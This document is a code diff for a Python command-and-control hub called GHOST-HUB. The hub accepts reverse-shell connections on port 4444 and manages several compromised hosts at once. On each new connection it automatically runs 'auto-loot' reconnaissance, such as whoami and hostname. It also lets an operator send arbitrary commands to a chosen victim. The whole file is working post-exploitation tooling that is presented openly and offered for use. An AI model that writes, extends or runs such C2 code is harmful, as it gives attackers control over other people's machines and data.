@@ -1,115 +1,108 @@
-# --- Module Context: Ghost-Hub (C2 Dashboard) ---
-# Purpose: Multi-session manager for managing concurrent reverse shells.
-# Rules:
-#   - Never close the Hub while sessions are active (sessions will drop).
-#   - Use 'interact <ID>' to tunnel into a specific ghost.
-#   - Background 'Auto-Loot' runs on connection to map target info.
-# Dependencies: socket, threading, rich
-# ------------------------------------------------
+# --- Module Context: GHOST-HUB (C2 Engine) ---
+# Purpose: Multi-session manager with automated post-exploitation tasks.
+# ---------------------------------------------
 
 import socket
 import threading
 import time
 from rich.console import Console
 from rich.table import Table
-from rich.live import Live
-from core.ui import show_briefing, draw_header
+from core.ui import draw_header, show_briefing
+from modules.looter import auto_recon
 
 console = Console()
 
 
 class GhostHub:
     def __init__(self):
-        self.sessions = {}  # {id: {'socket': s, 'addr': a, 'info': '...'}}
+        self.sessions = {}  # {id: {'socket': s, 'addr': a, 'status': '...'}}
         self.counter = 1
         self.lock = threading.Lock()
 
-    def start_listener(self, port):
-        """Standard TCP listener with multi-threading."""
+    def start_hub(self, port=4444):
+        """Unified Listener: Replaces modules/listener.py."""
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
             server.bind(("0.0.0.0", int(port)))
-            server.listen(20)
+            server.listen(50)
             while True:
                 conn, addr = server.accept()
                 with self.lock:
                     s_id = self.counter
                     self.sessions[s_id] = {'socket': conn,
-                                           'addr': addr, 'info': 'Pending...'}
+                                           'addr': addr, 'status': 'Looting...'}
                     self.counter += 1
-                # Trigger Auto-Loot background task
-                threading.Thread(target=self.auto_loot,
+                # Background Auto-Looting
+                threading.Thread(target=self.initial_loot,
                                  args=(s_id,), daemon=True).start()
-        except:
-            pass
+        except Exception as e:
+            console.print(f"[red]Server Error:[/red] {e}")
 
-    def auto_loot(self, s_id):
-        """Automatically gathers system context from new ghosts."""
+    def initial_loot(self, s_id):
+        """Zero-Touch Intel Gathering."""
         try:
             sock = self.sessions[s_id]['socket']
-            sock.send(b"whoami && hostname\n")
-            data = sock.recv(1024).decode().strip()
+            intel = auto_recon(sock)
             with self.lock:
-                self.sessions[s_id]['info'] = data if data else "Unknown System"
+                self.sessions[s_id]['status'] = f"Online ({intel['user']}@{intel['host']})"
         except:
             with self.lock:
-                self.sessions[s_id]['info'] = "Looting Failed"
+                self.sessions[s_id]['status'] = "Online (Active)"
 
     def interact(self, s_id):
-        """Interactive shell tunnel for a specific session."""
+        """Interactive Shell Interaction."""
         if s_id not in self.sessions:
             return
         sock = self.sessions[s_id]['socket']
         console.print(
-            f"[bold red][!] TUNNEL OPEN: Ghost {s_id}. Type 'back' to detach.[/bold red]")
+            f"[bold red][!] Controlling Ghost {s_id}. Type 'back' to detach.[/bold red]")
         while True:
-            cmd = console.input(f"[Ghost-{s_id}]# ").strip()
+            cmd = console.input(f"Ghost-{s_id}> ").strip()
             if cmd.lower() == "back":
                 break
             if not cmd:
                 continue
-            sock.send((cmd + "\n").encode())
-            console.print(sock.recv(4096).decode())
+            try:
+                sock.send((cmd + "\n").encode())
+                # Dynamic buffer handling for large responses
+                data = sock.recv(8192).decode()
+                console.print(data)
+            except Exception as e:
+                console.print(f"[red]Lost Connection:[/red] {e}")
+                break
 
 
 hub = GhostHub()
 
 
 def run_ghost_hub():
-    show_briefing(
-        "GHOST-HUB C2",
-        "Centralized management for multiple concurrent 'Ghost' sessions.",
-        ["LPORT must match your Forge payloads",
-            "Multiple sessions can be backgrounded"]
-    )
+    show_briefing("GHOST-HUB C2", "Multi-session C2 management.",
+                  ["LPORT must match payloads"])
     port = console.input(
-        "[bold yellow]LPORT (Default 4444): [/bold yellow]") or "4444"
+        "[bold yellow]C2 Port (Default 4444): [/bold yellow]") or "4444"
 
-    # Run listener in background
-    threading.Thread(target=hub.start_listener,
-                     args=(port,), daemon=True).start()
+    # Run the server in a daemon thread so it stays active
+    threading.Thread(target=hub.start_hub, args=(port,), daemon=True).start()
 
     while True:
-        draw_header("Ghost Dashboard")
+        draw_header("C2 Dashboard")
         table = Table(
-            title=f"Listening on Port {port}", border_style="magenta")
+            title=f"Hub Active on Port {port}", border_style="magenta")
         table.add_column("ID", style="yellow")
-        table.add_column("Address", style="cyan")
-        table.add_column("System Info (Auto-Loot)", style="green")
+        table.add_column("Target IP", style="cyan")
+        table.add_column("Intel / Status", style="green")
 
         with hub.lock:
             for sid, data in hub.sessions.items():
-                table.add_row(str(sid), data['addr'][0], data['info'])
+                table.add_row(str(sid), data['addr'][0], data['status'])
 
         console.print(table)
-        cmd_input = console.input(
+        choice = console.input(
             "\n[Hub] (interact <id> / exit)> ").strip().split()
-        if not cmd_input:
+        if not choice:
             continue
-
-        cmd = cmd_input[0].lower()
-        if cmd == "exit":
+        if choice[0] == "exit":
             break
-        if cmd == "interact" and len(cmd_input) > 1:
-            hub.interact(int(cmd_input[1]))
+        if choice[0] == "interact" and len(choice) > 1:
+            hub.interact(int(choice[1]))
